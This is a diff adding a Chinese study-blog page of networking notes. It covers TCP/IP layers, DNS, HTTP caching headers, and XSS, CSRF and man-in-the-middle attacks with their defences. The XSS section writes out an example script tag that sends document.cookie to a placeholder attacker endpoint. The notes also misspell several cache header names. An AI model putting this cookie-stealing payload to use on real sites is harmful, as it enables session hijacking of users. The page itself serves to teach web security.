@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>网络 - Keep Learning</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Keep Learning"><meta name="msapplication-TileImage" content="/images/Keep-logo.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Keep Learning"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="OSI 7 层参考模型TCP&amp;#x2F;IP 协议 应用层(HTTP&amp;#x2F;HTTPS&amp;#x2F;DNS) 传输层(TCP&amp;#x2F;UDP) internet 层(IP) 网络接口层(物理接口)  TCPTransmisson Control Prorocol"><meta property="og:type" content="blog"><meta property="og:title" content="网络"><meta property="og:url" content="https://wxyhahaha.github.io/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/%E7%BD%91%E7%BB%9C/"><meta property="og:site_name" content="Keep Learning"><meta property="og:description" content="OSI 7 层参考模型TCP&amp;#x2F;IP 协议 应用层(HTTP&amp;#x2F;HTTPS&amp;#x2F;DNS) 传输层(TCP&amp;#x2F;UDP) internet 层(IP) 网络接口层(物理接口)  TCPTransmisson Control Prorocol"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://wxyhahaha.github.io/img/og_image.png"><meta property="article:published_time" content="2022-05-04T03:08:20.000Z"><meta property="article:modified_time" content="2022-07-04T03:33:32.058Z"><meta property="article:author" content="wuxunyu"><meta property="article:tag" content="知识点"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://wxyhahaha.github.io/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/%E7%BD%91%E7%BB%9C/"},"headline":"网络","image":["https://wxyhahaha.github.io/img/og_image.png"],"datePublished":"2022-05-04T03:08:20.000Z","dateModified":"2022-07-04T03:33:32.058Z","author":{"@type":"Person","name":"wuxunyu"},"publisher":{"@type":"Organization","name":"Keep Learning","logo":{"@type":"ImageObject","url":"https://wxyhahaha.github.io/images/Keep-logo.png"}},"description":"OSI 7 层参考模型TCP&#x2F;IP 协议 应用层(HTTP&#x2F;HTTPS&#x2F;DNS) 传输层(TCP&#x2F;UDP) internet 层(IP) 网络接口层(物理接口)  TCPTransmisson Control Prorocol"}</script><link rel="canonical" href="https://wxyhahaha.github.io/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/%E7%BD%91%E7%BB%9C/"><link rel="icon" href="/images/Keep-logo.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 6.2.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/Keep-logo.png" alt="Keep Learning" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">文章</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" target="_blank" rel="noopener" href="https://github.com/wxyhahaha/keepeact">Keepeact</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-05-04T03:08:20.000Z" title="2022-5-4 11:08:20 ├F10: AM┤">2022-05-04</time>发表</span><span class="level-item"><time dateTime="2022-07-04T03:33:32.058Z" title="2022-7-4 11:33:32 ├F10: AM┤">2022-07-04</time>更新</span><span class="level-item">11 分钟读完 (大约1646个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">网络</h1><div class="content"><h2 id="OSI-7-层参考模型"><a href="#OSI-7-层参考模型" class="headerlink" title="OSI 7 层参考模型"></a>OSI 7 层参考模型</h2><h2 id="TCP-x2F-IP-协议"><a href="#TCP-x2F-IP-协议" class="headerlink" title="TCP&#x2F;IP 协议"></a>TCP&#x2F;IP 协议</h2><ol>
+<li>应用层(<code>HTTP</code>&#x2F;<code>HTTPS</code>&#x2F;<code>DNS</code>)</li>
+<li>传输层(<code>TCP</code>&#x2F;<code>UDP</code>)</li>
+<li>internet 层(<code>IP</code>)</li>
+<li>网络接口层(<code>物理接口</code>)</li>
+</ol>
+<h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p><strong>Transmisson Control Prorocol</strong></p>
+<ol>
+<li>连接建立</li>
+<li>可靠性传输<br>特点： 三次握手四次挥手</li>
+</ol>
+<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p><strong>User DataGram Protocol</strong></p>
+<ol>
+<li>非连接，不可靠传输方式</li>
+<li>效率高，速度快，适合音频和视频</li>
+</ol>
+<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p><strong>Domain Name System</strong><br>域名解析系统<br>怎么查找域名：<br>DNS 域名解析采用的是递归查询的方式，过程，DNS 缓存&gt;根域名服务器&gt;根域名下一级</p>
+<h2 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h2><p>Hypertext Transfer Protocol<br>超文本传输协议</p>
+<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>数据库缓存、服务器端缓存（<code>nginx</code>、<code>CDN 缓存</code>）、浏览器缓存<br>浏览器缓存由包含很多内容：<code>HTTP 缓存</code>、<code>indexDB</code>、<code>cookie</code>、<code>localstorage </code>等等</p>
+<h3 id="HTTP-缓存"><a href="#HTTP-缓存" class="headerlink" title="HTTP 缓存"></a>HTTP 缓存</h3><p>强缓存和协商缓存的区别就是，强缓存是不需要发请求到服务器的，而协商缓存是需要浏览器发送请求到服务器判断本地的缓存是否失效，若不失效则不请求服务器，反之请求服务器获取最新资源</p>
+<h3 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h3><p>命中强缓存时，状态码为 200（Size 列标识为 from cache）的响应请求，利用 <code>Expire</code>s 和<code> Cache-Control</code> 控制强缓存。</p>
+<ol>
+<li>Expires<br>该值是响应头的字段，指定缓存到期的时间， <code>Expires=时间</code>，该时间为绝对时间，<code>Last-Modify</code> 结合使用</li>
+<li>Cache-Control<br>该值是响应头的字段，指定缓存到期的时间，<code>Cache-Control=max-age+时间</code>，该事件为相对时间</li>
+</ol>
+<p><code>Cache-Control</code> 优先级比 <code>Expires</code> 高<br>优点：<br>服务器配置有限，降低服务器压力，1 台服务器能做到 10 台服务器的能力</p>
+<blockquote>
+<p>&lt;- Expires: xxxx<br>&lt;- Cache-Control:max-age&#x3D;600</p>
+</blockquote>
+<h3 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h3><p>命中协商缓存时，状态码为 304，利用 <code>Last-Modify/If-Modify-Since</code></p>
+<ol>
+<li>Last-Modify&#x2F;If-Modify-Since<br>第一次请求服务器，返回时会带上 <code>Last-Modify</code> 的响应头，标识着该资源最后修改时间，第二次请求时会带上 <code>If-Modify-since</code> 请求头，值为第一次响应的 <code>Last-Modify</code> 值，服务器会根据 <code>If-Modify-since</code> 判断是否命中缓存，<strong>如果命中则不请求服务器，返回 304</strong>，不返回 <code>Last-Modify</code><br>第一次响应： <code>Last-Modify</code><br>第二次请求： <code>If-Modify-since</code></li>
+<li>Etag&#x2F;If-None-Match<br><code>Etag/If-None-Match</code> <code>返回的是一个校验码，Etag</code> 保证每个资源时唯一的，资源的变化都为导致 Etag 改变，服务器根据浏览器发送的 <code>If-None-Match</code> 判断是否命中缓存<br>两者会优先验证 <code>Etag</code>,两种区别：</li>
+</ol>
+<ul>
+<li>精度问题，第一种的精度时精确到秒，当资源的改变在秒级的时候，不太准确。所以由了 <code>Etag</code></li>
+<li>文件定期生成，当内容一样时，无法使用 <code>Last-Modify</code> 这一套</li>
+<li>有可能存在服务器没有准确获取文件修改时间等，<code>Last-Modify</code> 也不能使用</li>
+</ul>
+<blockquote>
+<p>&lt;- last-modifed: xxx<br>-&gt; if-modified-since: xxx<br>&lt;- etag: bbb<br>-&gt; if-noe-match: bbb</p>
+</blockquote>
+<h1 id="web-安全"><a href="#web-安全" class="headerlink" title="web 安全"></a>web 安全</h1><h2 id="浏览器如何获取到-Cookie"><a href="#浏览器如何获取到-Cookie" class="headerlink" title="浏览器如何获取到 Cookie"></a>浏览器如何获取到 Cookie</h2><ul>
+<li>利用接口响应的 Set-Cookie 字段<br>有哪些属性</li>
+</ul>
+<ol>
+<li>domain</li>
+<li>max-age、Express</li>
+<li>httponly</li>
+<li>name&#x3D;value</li>
+</ol>
+<h2 id="XSS-Cross-Site-Script-跨站脚本攻击"><a href="#XSS-Cross-Site-Script-跨站脚本攻击" class="headerlink" title="XSS (Cross-Site-Script) 跨站脚本攻击"></a>XSS (Cross-Site-Script) 跨站脚本攻击</h2><p>恶意攻击者，将一些恶意代码插入到网页，当用户访问的时候自动执行这段代码，从而达到攻击者目的</p>
+<ol>
+<li>反射型<br>特点： 一次性<br>用户点开带有恶意的 url（含有 script），浏览器将此段发送给服务端，服务端返回客户端，此时浏览器识别到可执行代码将其执行</li>
+<li>存储型<br>特点：恶意代码存储到服务器<br>攻击者提交含有 script 标签的恶意代码表单到服务器，服务端将其保存，展示给其他用户时执行恶意代码</li>
+</ol>
+<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><ol>
+<li>将 <code>&lt;script scr=&quot;https://攻击者接口?cookie=document.cookie&quot;&gt; &lt;/script&gt;</code>， 注册成用户名， 提交给服务端，服务端保存</li>
+<li>用户登录，如果查看到这个攻击者的账号信息相关，那么会执行恶意代码，将 cookie 拿到，发送到攻击者接口</li>
+<li>攻击者事先会收集各种接口，找到相关可以获取到用户的接口</li>
+<li>通过 cookie 获取到用户信息（手机号等）等</li>
+</ol>
+<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ol>
+<li>冒充身份</li>
+<li>刷点击（注入文章地址）</li>
+<li>弹广告（注入一段创建弹窗的代码）</li>
+<li>蠕虫病毒（冒充身份去发送邮件，联系人点开又会冒充去发送邮件….）</li>
+</ol>
+<h3 id="怎么防御"><a href="#怎么防御" class="headerlink" title="怎么防御"></a>怎么防御</h3><ol>
+<li>输入过滤，对于特殊符号等不允许提交</li>
+<li>httponly</li>
+<li>转义 HTML 比如： <code>&lt; =&gt; &amp;lt</code> 、 <code>&gt; =&gt; &amp;gt</code></li>
+</ol>
+<h2 id="CSRF-Cross-Site-Request-Forgery-跨站点请求伪造"><a href="#CSRF-Cross-Site-Request-Forgery-跨站点请求伪造" class="headerlink" title="CSRF (Cross-Site-Request-Forgery) 跨站点请求伪造"></a>CSRF (Cross-Site-Request-Forgery) 跨站点请求伪造</h2><p>诱导受害者去到攻击者的网站，攻击者网站发起了相关请求，并且带上了受害者 cookie，从而可以做一些恶意的操作</p>
+<p>前提： 浏览器没有严格执行同源政策，请求所在网站必须和请求的接口同源，就有可能发生 CSRF</p>
+<h3 id="实现过程-1"><a href="#实现过程-1" class="headerlink" title="实现过程"></a>实现过程</h3><ol>
+<li>受害者登录信任网站</li>
+<li>未关闭含有 cookie 的信任网站</li>
+<li>诱导受害者去攻击者网站（如果配合 XSS 此时可能会直接跳转，或者弹窗诱导到攻击者网站）</li>
+<li>在攻击者网站（用隐藏表单自动发送请求，img&#x2F;src 自动 get 请求等骚操作…）发起信任网站相关接口，此时会携带用户的 cookie，冒充用户</li>
+</ol>
+<h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><ol>
+<li>冒充身份</li>
+<li>蠕虫病毒（冒充身份去发送邮件，联系人点开又会冒充去发送邮件….）</li>
+</ol>
+<h3 id="怎么防御-1"><a href="#怎么防御-1" class="headerlink" title="怎么防御"></a>怎么防御</h3><ol>
+<li>用验证码，信任网站开启验证码，而攻击者网站没办法获取正确验证码</li>
+<li>Referer ，表明请求的站点地址，但是有可能存在伪造 <code>Referer</code> 头</li>
+<li>token，客户端接收服务端的 token，保存在隐藏区域（本地存储，隐藏的 html 元素，代码内存等），请求带上 token</li>
+<li>使用带有同源政策的浏览器，升级到默认开启严格模式版本</li>
+</ol>
+<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>是在数据传输时发生的攻击手段。截取 http 在传输时数据包，获取用户信息，篡改信息，篡改密钥</p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>网络</p><p><a href="https://wxyhahaha.github.io/2022/05/04/知识点/网络/">https://wxyhahaha.github.io/2022/05/04/知识点/网络/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>wuxunyu</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-05-04</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2022-07-04</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://github.com/wxyhahaha/wxyhahaha.github.io" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/vue/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">vue</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/"><span class="level-item">数据结构和算法</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://avatars.githubusercontent.com/u/43501648?s=128&amp;v=4" alt="a.Hon"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">a.Hon</p><p class="is-size-6 is-block">S</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Guangzhou</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">3</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/wxyhahaha" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/wxyhahaha"><i class="fab fa-github"></i></a></div></div></div><!--!--><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-04T03:08:20.000Z">2022-07-04</time></p><p class="title"><a href="/2022/07/04/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/keepeact/">keepeact</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-06-25T03:08:20.000Z">2022-06-25</time></p><p class="title"><a href="/2022/06/25/%E9%9D%A2%E8%AF%95/%E6%B7%B1%E4%BF%A1%E6%9C%8D/">深信服</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-06-25T03:08:20.000Z">2022-06-25</time></p><p class="title"><a href="/2022/06/25/%E9%9D%A2%E8%AF%95/%E9%A1%B9%E7%9B%AE%E9%9D%A2/">项目面</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-04T03:08:20.000Z">2022-05-04</time></p><p class="title"><a href="/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/browser/">浏览器进程</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-04T03:08:20.000Z">2022-05-04</time></p><p class="title"><a href="/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/style/">style</a></p></div></article></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">七月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">六月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">五月 2022</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/"><span class="tag">个人项目</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/"><span class="tag">知识点</span><span class="tag">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9D%A2%E8%AF%95/"><span class="tag">面试</span><span class="tag">2</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/Keep-logo.png" alt="Keep Learning" height="28"></a><p class="is-size-7"><span>&copy; 2022 wuxunyu</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
